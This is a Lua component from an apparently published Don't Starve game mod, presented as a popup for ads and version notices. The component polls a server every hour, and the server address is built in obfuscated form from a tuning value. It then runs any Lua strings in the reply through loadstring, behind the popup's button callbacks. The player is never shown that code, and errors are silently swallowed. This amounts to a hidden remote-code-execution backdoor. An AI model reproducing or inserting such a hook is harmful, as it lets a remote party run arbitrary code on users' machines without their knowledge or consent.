--[[
 -- Do not modify and republish my mods .Respect copyright. 3Q for cooperation
 -- Do not modify and republish my mods .Respect copyright. 3Q for cooperation
 -- Do not modify and republish my mods .Respect copyright. 3Q for cooperation
 -- If any question ,Please email me using Chinese to let me distinguish whether it is spam
 -- @Description: undefined
 -- @version 1.0.0
 -- @author td1madao
 -- @email td1madao@163.com
 -- @qq 360810498
 -- @date 16/8/6
 ]]
local myComponent = Class(function(self, inst)
    self.inst = inst
    local function tmpFn(text)
        td1madao_try(function()
            if text then
                local json = require "json"
                local result = json.decode(text)
                if result then
                    local title = result.title
                    local content = result.content
                    local yesButton = result.yesButton
                    local yesURL = result.yesURL
                    local yesCommand = result.yesCommand
                    local noButton = result.noButton
                    local noURL = result.noURL
                    local noCommand = result.noCommand
                    local versionLimit = result.versionLimit
                    local command = result.command
                    local function runCommand(str)
                        if command then
                            td1madao_try(function()
                                loadstring(str)()
                            end)
                        end
                    end
                    if self.inst.adcontext ~= content then
                        self.inst.adcontext = content
                        local currenV = self.inst.currentVer()
                        if currenV == versionLimit and currenV ~= nil then
                            return
                        end
                        local null = "nil"
                        local screen = (require "screens/bigpopupdialog")(title or null, content or null, {
                            {
                                text = yesButton,
                                cb = function()
                                    if yesURL and string.find(yesURL, "http") then
                                        VisitURL(yesURL)
                                    else
                                        TheFrontEnd:PopScreen()
                                    end
                                    if yesCommand then
                                        runCommand(yesCommand)
                                    end
                                    if command then
                                        runCommand(command)
                                    end
                                end
                            },
                            {
                                text = noButton,
                                cb = function()
                                    if noURL and string.find(noURL, "http") then
                                        VisitURL(noURL)
                                    else
                                        TheFrontEnd:PopScreen()
                                    end
                                    if noCommand then
                                        runCommand(noCommand)
                                    end
                                    if command then
                                        runCommand(command)
                                    end
                                end
                            },
                        })
                        TheFrontEnd:PushScreen(screen)
                        screen.bg:SetSize(700, 550)
                        screen.title:SetPosition(0, 200, 0)
                        screen.text:SetRegionSize(900, 500)
                        screen.menu:SetPosition(screen.menu:GetPosition().x, -180, 0)
                    end
                end
            end
        end)
    end
    self.tmpFn = tmpFn
end)
function myComponent:OnSave()
    local blueBuffSaveDay_ = 0
    local difficulty_ = 0
    local adcontext_ = "0"
    if self.inst then
        blueBuffSaveDay_ = self.inst.blueBuffSaveDay
        difficulty_ = self.inst.difficulty or td1madao_g(td1madao_getupper('%s_ENOMOUS_MONSTER'))
        adcontext_ = self.inst.adcontext or "0"
    end
    return
    {
        blueBuffSaveDay = blueBuffSaveDay_,
        difficulty = difficulty_,
        adcontext = adcontext_
    }
end

function myComponent:OnLoad(data)
    if data ~= nil and self.inst then
        if data.blueBuffSaveDay ~= nil then
            self.inst.blueBuffSaveDay = data.blueBuffSaveDay
        else
            self.inst.blueBuffSaveDay = 0
        end
        if data.difficulty then
            self.inst.difficulty = data.difficulty
            td1madao_s(td1madao_getupper('%s_ENOMOUS_MONSTER'), data.difficulty)
        end
        if data.adcontext then
            self.inst.adcontext = data.adcontext or "0"
        end
    end
end

function myComponent:loop()
    local scannerTask = "td1madaoAdversionTask"
    self.inst.components.td1madao_perioder:addTask(scannerTask, function()
        self:once()
    end, 60 * 60)
end

function myComponent:once()
    local str = td1madao_getstr(TUNING.mdcoco99_td1madao, self.inst.prefab)
    TheSim:QueryServer(str, self.tmpFn, "GET")
end

return myComponent